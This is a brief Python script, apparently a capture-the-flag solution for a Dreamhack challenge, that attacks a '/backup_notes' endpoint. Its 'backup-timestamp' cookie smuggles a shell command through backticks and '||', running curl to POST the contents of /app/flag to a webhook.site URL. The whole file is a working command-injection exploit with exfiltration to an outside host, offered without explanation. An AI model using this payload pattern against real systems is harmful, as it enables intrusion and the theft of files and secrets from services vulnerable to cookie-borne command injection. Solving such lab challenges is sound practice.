import requests

URL = "http://host3.dreamhack.games:11828"
webhook = "https://webhook.site/7afc45b6-ad33-4b38-bbac-60a4c1210253"

payload = f'`test||curl -X POST -d "$(cat /app/flag)" {webhook}`'

cookies = {
    'backup-timestamp': payload
}

res = requests.post(URL+'/backup_notes', cookies=cookies)
print(res)
